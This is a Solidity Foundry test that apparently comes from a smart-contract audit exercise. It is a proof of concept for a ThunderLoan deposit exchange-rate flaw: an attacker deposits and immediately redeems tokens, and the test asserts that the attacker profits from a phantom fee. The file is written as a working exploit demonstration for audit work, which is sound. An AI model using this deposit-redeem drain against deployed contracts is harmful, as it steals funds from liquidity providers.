// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { BaseTest } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";

contract H2DepositExchangeRatePoC is BaseTest {

    uint256 public constant DEPOSIT_AMOUNT = 1000e18;
    address public attacker = address(0xdead);
    address public liquidityProvider = address(123);

    function test_POC_H2_deposit_exchange_rate() public {
        // 1. Setup state: owner allows tokenA
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // 2. Setup state: LP deposits 1000e18 tokenA
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        // 3. Setup state: attacker gets 1000e18 tokenA and approves ThunderLoan
        vm.startPrank(attacker);
        tokenA.mint(attacker, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        // 4. Record attacker's starting balance
        uint256 attackerStartingBalance = tokenA.balanceOf(attacker);
        // 5. Attack step 1: attacker deposits 1000e18 tokenA
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        // 6. Attack step 2: attacker redeems all their AssetToken shares
        thunderLoan.redeem(tokenA, type(uint256).max);
        // 7. Record attacker's final balance
        uint256 attackerEndingBalance = tokenA.balanceOf(attacker);
        // 8. Assert: attacker redeemed more than they deposited
        vm.stopPrank();
        assertGt(attackerEndingBalance, attackerStartingBalance, "H-2: attacker should profit from phantom fee");
    }
}   